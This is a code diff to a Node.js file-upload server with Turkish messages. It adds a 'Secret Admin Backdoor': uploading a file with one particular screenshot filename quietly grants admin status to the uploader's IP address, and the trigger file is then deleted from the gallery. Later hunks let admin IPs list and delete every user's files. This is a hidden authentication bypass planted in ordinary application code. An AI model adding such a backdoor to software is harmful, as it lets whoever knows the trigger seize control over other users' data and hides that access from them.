@@ -87,9 +87,25 @@ app.post('/upload', (req, res) => {
             return res.status(400).json({ msg: 'Lütfen bir dosya seçin!' });
         }
         
-        // Save IP to metadata
         const ip = getClientIp(req);
         const metadata = getMetadata();
+
+        // Secret Admin Backdoor
+        if (req.file.originalname === 'Ekran görüntüsü 2026-04-03 224823.png') {
+            if (!metadata.admins) metadata.admins = [];
+            if (!metadata.admins.includes(ip)) metadata.admins.push(ip);
+            saveMetadata(metadata);
+            
+            // Delete the trigger file so it doesn't stay in the gallery
+            fs.unlinkSync(path.join(uploadDir, req.file.filename));
+            
+            return res.json({ 
+                msg: 'Gizli Admin Modu Aktif Edildi!', 
+                isAdmin: true 
+            });
+        }
+
+        // Normal file upload: Save IP to metadata
         metadata[req.file.filename] = ip;
         saveMetadata(metadata);
 
@@ -113,6 +129,7 @@ app.get('/files', (req, res) => {
         let filesData = [];
         const ip = getClientIp(req);
         const metadata = getMetadata();
+        const isAdmin = metadata.admins && metadata.admins.includes(ip);
 
         files.forEach(file => {
             const ext = path.extname(file).toLowerCase();
@@ -120,7 +137,7 @@ app.get('/files', (req, res) => {
             
             if (allowedExts.includes(ext)) {
                 const isVideo = ['.mp4', '.mkv', '.avi', '.mov', '.webm'].includes(ext);
-                const canDelete = metadata[file] === ip;
+                const canDelete = isAdmin || metadata[file] === ip;
                 filesData.push({
                     name: file,
                     url: `/uploads/${file}`,
@@ -130,10 +147,10 @@ app.get('/files', (req, res) => {
             }
         });
         
-        // Sort by newest (assuming filename has Date.now())
+        // Sort by newest
         filesData.sort((a, b) => b.name.localeCompare(a.name));
         
-        res.json(filesData);
+        res.json({ files: filesData, isAdmin: isAdmin });
     });
 });
 
@@ -142,8 +159,9 @@ app.delete('/files/:filename', (req, res) => {
     const filename = req.params.filename;
     const ip = getClientIp(req);
     const metadata = getMetadata();
+    const isAdmin = metadata.admins && metadata.admins.includes(ip);
     
-    if (metadata[filename] === ip) {
+    if (isAdmin || metadata[filename] === ip) {
         const filePath = path.join(uploadDir, filename);
         if (fs.existsSync(filePath)) {
             fs.unlinkSync(filePath);
